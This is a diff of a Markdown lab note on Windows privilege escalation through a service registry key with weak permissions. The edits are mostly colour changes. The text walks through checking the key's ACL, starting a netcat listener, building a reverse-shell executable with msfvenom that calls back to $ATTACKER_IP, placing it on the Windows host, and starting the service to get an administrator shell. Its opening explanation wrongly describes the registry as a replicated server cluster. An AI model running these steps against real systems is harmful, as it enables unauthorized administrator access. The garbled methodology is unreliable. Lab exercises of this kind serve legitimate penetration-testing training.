@@ -1,11 +1,14 @@
-# <span style="color:lightblue">Service Registry</span>
+# <span style="color:#FF5555">Service Registry</span>
 
-## <span style="color:lightgreen">Methodology</span>
+> [!info] Variables used below
+> - `$ATTACKER_IP` – your attacking machine's IP
+
+## <span style="color:#8BE9FD">Methodology</span>
 A service registry consists of a cluster of servers that use a replication protocol to maintain consistency. Hence if we get Full Contol permission over the registry key, we can drop our malicious executable file to gain administrator access. 
 
-## <span style="color:lightgreen">Detection</span>
+## <span style="color:#8BE9FD">Detection</span>
 
-### Windows VM
+### <span style="color:#50FA7B">Windows VM</span>
 
 1. Open powershell prompt and type: 
 ```powershell
@@ -16,9 +19,9 @@ PS C:\Temp> Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
 
 2. Notice that the output suggests that user belong to `"NT AUTHORITY\INTERACTIVE"` has `"FullContol"` permission over the registry key.
 
-## <span style="color:lightgreen">Exploitation</span>
+## <span style="color:#8BE9FD">Exploitation</span>
 
-### Kali VM
+### <span style="color:#50FA7B">Kali VM</span>
 
 1. Start a netcat listener
 ```console
@@ -27,11 +30,11 @@ $ sudo nc -nvlp 53
 
 2. Open an additional command prompt and type: 
 ```console
-$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=[tun0 IP] LPORT=53 -f exe -o x.exe
+$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=$ATTACKER_IP LPORT=53 -f exe -o x.exe
 ```
 3. Copy the generated file `x.exe`, to the Windows VM.
 
-### Windows VM
+### <span style="color:#50FA7B">Windows VM</span>
 
 1. Place `x.exe` in `'C:\Temp'`
 2. Open command prompt at type: 
@@ -46,7 +49,7 @@ C:\Temp> sc start regsvc
 
 ![image](https://user-images.githubusercontent.com/59029171/161016977-7757f360-5b46-4201-949a-9338e79f5735.png)
 
-### Kali VM
+### <span style="color:#50FA7B">Kali VM</span>
 
 1. Wait for a reverse shell on your kali machine.
 
